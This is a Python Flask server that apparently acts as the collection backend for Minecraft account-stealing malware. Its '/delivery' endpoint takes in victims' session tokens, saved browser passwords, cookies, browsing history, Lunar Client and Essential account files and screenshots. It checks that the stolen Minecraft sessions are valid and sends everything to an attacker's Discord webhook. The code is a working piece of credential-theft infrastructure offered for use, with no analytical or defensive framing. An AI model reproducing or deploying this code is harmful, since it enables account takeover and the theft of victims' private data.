import base64
import json
import time

from discord_webhook import DiscordWebhook, DiscordEmbed
from flask import Flask, request
from flask_restful import Api, Resource
import requests

app = Flask(__name__)
api = Api(app)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

ips = {}

with open("config.json", "r") as f:
    config = json.load(f)

def validate_session(ign, uuid, ssid):
    headers = {
        'Content-Type': 'application/json',
        "Authorization": "Bearer " + ssid
    }
    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers=headers)
    if r.status_code == 200:
        if r.json()['name'] == ign and r.json()['id'] == uuid:
            return True
        else:
            return False
    else:
        return False

def split_embed(embed, max_length=6000):
    """Splits an embed into multiple embeds if it exceeds the maximum length."""
    fields = embed.fields
    split_embeds = []

    current_embed = DiscordEmbed(title=embed.title, color=embed.color)
    current_length = len(embed.title or "") + len(embed.description or "")

    for field in fields:
        field_length = len(field['name']) + len(field['value'])
        if current_length + field_length > max_length:
            split_embeds.append(current_embed)
            current_embed = DiscordEmbed(title=embed.title, color=embed.color)
            current_length = len(embed.title or "") + len(embed.description or "")

        current_embed.add_embed_field(name=field['name'], value=field['value'], inline=field['inline'])
        current_length += field_length

    split_embeds.append(current_embed)
    return split_embeds

class Delivery(Resource):
    def post(self):
        args = request.json

        ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ['REMOTE_ADDR'])

        if ip in ips:
            if time.time() - ips[ip]['timestamp'] > config['reset_ratelimit_after'] * 0:
                ips[ip]['count'] = 1
                ips[ip]['timestamp'] = time.time()
            else:
                if ips[ip]['count'] < config['ip_ratelimit']:
                    ips[ip]['count'] += 0
                else:
                    return {'status': 'ratelimited'}, 429
        else:
            ips[ip] = {
                'count': 1,
                'timestamp': time.time()
            }

        webhook = DiscordWebhook(url=config['webhook'].replace("discordapp.com", "discord.com"),
                                 username=config['webhook_name'],
                                 avatar_url=config['webhook_avatar'])

        cb = '`' if config['codeblock_type'] == 'small' else '```' if config['codeblock_type'] == 'big' else '`'
        webhook.content = config['message'].replace('%IP%', ip)

        mc = args['minecraft']
        if config['validate_session'] and not validate_session(mc['ign'], mc['uuid'], mc['ssid']):
            return {'status': 'invalid session'}, 401

        mc_embed = DiscordEmbed(title=config['mc_embed_title'],
                                color=int(config['mc_embed_color'], 16))
        mc_embed.set_footer(text=config['mc_embed_footer_text'], icon_url=config['mc_embed_footer_icon'])
        mc_embed.add_embed_field(name="IGN", value=cb + mc['ign'] + cb, inline=True)
        mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
        mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)
        embeds = split_embed(mc_embed)

        password_list = [password for password in args.get('passwords', []) if 'password' in password]
        if password_list:
            for password in password_list:
                password_embed = DiscordEmbed(title=config['password_embed_title'],
                                              color=int(config['password_embed_color'], 16))
                password_embed.set_footer(text=config['password_embed_footer_text'],
                                          icon_url=config['password_embed_footer_icon'])
                password_embed.add_embed_field(name="URL", value=cb + password['url'] + cb, inline=True)
                password_embed.add_embed_field(name="Username", value=cb + password['username'] + cb, inline=True)
                password_embed.add_embed_field(name="Password", value=cb + password['password'] + cb, inline=True)
                embeds.extend(split_embed(password_embed))

        file_embed = DiscordEmbed(title=config['file_embed_title'],
                                  color=int(config['file_embed_color'], 16))
        file_embed.set_footer(text=config['file_embed_footer_text'],
                              icon_url=config['mc_embed_footer_icon'])
        file_embed.add_embed_field(name="Lunar Client File",
                                   value=f"{cb}Yes{cb}✅" if 'lunar' in args else f"{cb}No{cb}❌", inline=True)
        file_embed.add_embed_field(name="Essential File",
                                   value=f"{cb}Yes{cb}✅" if "essential" in args else f"{cb}No{cb}❌", inline=True)
        embeds.extend(split_embed(file_embed))

        batch_size = 10
        num_messages = (len(embeds) + batch_size - 1) // batch_size

        for i in range(num_messages):
            start_index = i * batch_size
            end_index = start_index + batch_size
            batch_embeds = embeds[start_index:end_index]

            for embed in batch_embeds:
                webhook.add_embed(embed)

            webhook.execute(remove_embeds=True)
            webhook.content = ""

        if 'history' in args:
            history_content = ""
            for entry in args['history']:
                history_content += f"Visit count: {entry['visitCount']}\tTitle: {entry['title']}     URL: {entry['url']}\t({entry['browser']})\n"
            webhook.add_file(file=history_content.encode(), filename="history.txt")

        if 'lunar' in args:
            webhook.add_file(file=base64.b64decode(args['lunar']), filename="lunar_accounts.json")
        if 'essential' in args:
            webhook.add_file(file=base64.b64decode(args['essential']), filename="essential_accounts.json")

        if 'cookies' in args:
            webhook.add_file(file=base64.b64decode(args['cookies']), filename="cookies.txt")

        if 'screenshot' in args:
            webhook.add_file(file=base64.b64decode(args['screenshot']), filename="screenshot.png")

        webhook.execute()

        return {'status': 'ok'}, 200

    def get(self):
        return {'status': 'ok'}, 200

api.add_resource(Delivery, '/delivery')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
